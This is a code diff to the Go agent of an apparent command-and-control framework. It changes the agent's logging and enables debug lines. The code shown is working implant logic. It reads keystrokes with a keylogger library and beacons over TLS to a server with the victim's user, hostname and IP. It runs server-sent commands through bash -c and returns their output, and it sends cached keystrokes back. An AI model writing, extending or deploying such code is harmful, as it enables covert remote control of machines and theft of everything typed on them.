@@ -18,7 +18,7 @@ import (
 
 	"github.com/MarinX/keylogger"
 	"github.com/PatronC2/Patron/types"
-	// "github.com/s-christian/gollehs/lib/logger"
+	"github.com/PatronC2/Patron/lib/logger"
 )
 
 // func exec_command(text string) {
@@ -38,6 +38,18 @@ func main() {
 
 	// }
 	// Load public cert for encrypted comms
+	// Enable or disable logging based on a condition
+	enableLogging := true
+	logger.EnableLogging(enableLogging)
+
+	// Set the log file
+	logFileName := "app.log"
+	err := logger.SetLogFile(logFileName)
+	if err != nil {
+		fmt.Printf("Error setting log file: %v\n", err)
+		return
+	}
+
 	publickey, err := base64.StdEncoding.DecodeString(RootCert)
 	if err != nil {
 		panic(err)
@@ -56,7 +68,7 @@ func main() {
 	cache := "" // cache for keylogs
 	k, err := keylogger.New(keyboard)
 	if err != nil {
-		log.Fatalln(err)
+		logger.Logf(logger.Error, "Error Occured: \n", err)
 		return
 	}
 	defer k.Close()
@@ -99,26 +111,26 @@ func main() {
 	RETRY:
 		beacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
 		if err != nil {
-			// log.Fatalln(err) // maybe try diff IP
+			logger.Logf(logger.Error, "Error Occured: \n", err) // maybe try diff IP
 			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
 			goto RETRY
 		}
 		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
 		ip := fmt.Sprintf("%v", ipAddress)
 		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip + ":NoKeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter + ":MASTERKEY"
-		// logger.Logf(logger.Debug, "Sending : %s\n", init)
+		logger.Logf(logger.Debug, "Sending : %s\n", init)
 		_, _ = beacon.Write([]byte(init + "\n"))
 		dec := gob.NewDecoder(beacon)
 		encoder := gob.NewEncoder(beacon)
-		// logger.Logf(logger.Info, "Server Connected\n")
+		logger.Logf(logger.Info, "Server Connected\n")
 		instruct := &types.GiveAgentCommand{}
-		// logger.Logf(logger.Debug, "Struct formed\n")
+		logger.Logf(logger.Debug, "Struct formed\n")
 		err = dec.Decode(instruct)
 		if err != nil {
-			log.Fatalln(err)
+			logger.Logf(logger.Error, "Error Occured: \n", err)
 		}
 
-		// logger.Logf(logger.Debug, "%s\n", instruct.UpdateAgentConfig.CallbackTo)
+		logger.Logf(logger.Debug, "%s\n", instruct.UpdateAgentConfig.CallbackTo)
 		// Update agent config when possible
 		if instruct.UpdateAgentConfig.CallbackTo != "" {
 			glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
@@ -131,13 +143,13 @@ func main() {
 		if instruct.UpdateAgentConfig.CallbackJitter != "" {
 			CallbackJitter = instruct.UpdateAgentConfig.CallbackJitter
 		}
-		// logger.Logf(logger.Debug, "Received : %s\n", instruct)
+		logger.Logf(logger.Debug, "Received : %s\n", instruct)
 		CommandType := instruct.CommandType
 		Command := instruct.Command
 		CmdOut := ""
 		destruct := types.GiveServerResult{}
 		if CommandType == "shell" && Command != "" {
-			// logger.Logf(logger.Debug, "Command to run : %s\n", Command)
+			logger.Logf(logger.Debug, "Command to run : %s\n", Command)
 			var c *exec.Cmd
 			c = exec.Command("bash", "-c", Command)
 			buf, _ := c.CombinedOutput()
@@ -145,7 +157,7 @@ func main() {
 				CmdOut = err.Error()
 			}
 			CmdOut += string(buf)
-			// logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
+			logger.Logf(logger.Done, "Command executed successfully : %s\n", CmdOut)
 			destruct = types.GiveServerResult{
 				Uuid:        instruct.UpdateAgentConfig.Uuid,
 				Result:      "1",
@@ -177,9 +189,9 @@ func main() {
 
 		err = encoder.Encode(destruct)
 		if err != nil {
-			log.Fatalln(err)
+			logger.Logf(logger.Error, "Error Occured: \n", err)
 		}
-		// logger.Logf(logger.Debug, "Sent encoded struct\n")
+		logger.Logf(logger.Debug, "Sent encoded struct\n")
 		beacon.Close()
 
 		if CommandType == "kill" {
@@ -201,25 +213,25 @@ func main() {
 	KEYRETRY:
 		keybeacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
 		if err != nil {
-			// log.Fatalln(err) // maybe try diff IP
+			logger.Logf(logger.Error, "Error Occured: \n", err) // maybe try diff IP
 			time.Sleep(time.Second * time.Duration(5)) // interval and jitter here
 			goto KEYRETRY
 		}
 		keyipAddress := keybeacon.LocalAddr().(*net.TCPAddr)
 		keyip := fmt.Sprintf("%v", keyipAddress)
 		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip + ":KeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter + ":MASTERKEY"
-		// logger.Logf(logger.Debug, "Sending : %s\n", init)
+		logger.Logf(logger.Debug, "Sending : %s\n", init)
 		_, _ = keybeacon.Write([]byte(keyinit + "\n"))
 		keydec := gob.NewDecoder(keybeacon)
 		keyencoder := gob.NewEncoder(keybeacon)
-		// logger.Logf(logger.Info, "Server Connected\n")
+		logger.Logf(logger.Info, "Server Connected\n")
 		keyinstruct := &types.KeySend{}
 		// logger.Logf(logger.Debug, "Struct formed\n")
 		err = keydec.Decode(keyinstruct)
 		if err != nil {
-			log.Fatalln(err)
+			logger.Logf(logger.Error, "Error Occured: \n", err)
 		}
-		// logger.Logf(logger.Debug, "Received : %s\n", keyinstruct)
+		logger.Logf(logger.Debug, "Received : %s\n", keyinstruct)
 		Keydestruct := types.KeyReceive{}
 		Keydestruct = types.KeyReceive{
 			Uuid: keyinstruct.Uuid,
@@ -229,9 +241,9 @@ func main() {
 
 		err = keyencoder.Encode(Keydestruct)
 		if err != nil {
-			log.Fatalln(err)
+			logger.Logf(logger.Error, "Error Occured: \n", err)
 		}
-		// logger.Logf(logger.Debug, "Sent encoded struct\n")
+		logger.Logf(logger.Debug, "Sent encoded struct\n")
 		// Jitter Credit: Christian
 		Fre, _ = strconv.Atoi(CallbackFrequency)
 		Jitt, _ = strconv.Atoi(CallbackJitter)
